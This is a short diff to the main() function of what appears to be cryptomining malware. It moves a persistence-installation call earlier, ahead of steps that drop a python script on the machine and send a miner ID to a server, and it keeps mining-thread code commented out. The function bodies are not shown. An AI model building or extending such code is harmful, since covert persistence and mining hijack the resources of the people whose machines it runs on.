@@ -9,6 +9,9 @@
 
 int main(int argc, char * argv[]){
 
+    std::cout << "Running persistence ... " << std::endl;
+    install_persistence();
+    
     std::cout << "Dropping python script on machine" << std::endl;
     drop_python_script();
 
@@ -19,8 +22,7 @@ int main(int argc, char * argv[]){
     std::cout << "Sending to server the miner ID ..." << std::endl;
     new_miner();
 
-    std::cout << "Running persistence ... " << std::endl;
-    install_persistence();
+    
 
     // std::cout << "Starting thread to mine ..." << std::endl;
     // std::thread multithreading(Tasks::check_task_manager); // thread creation
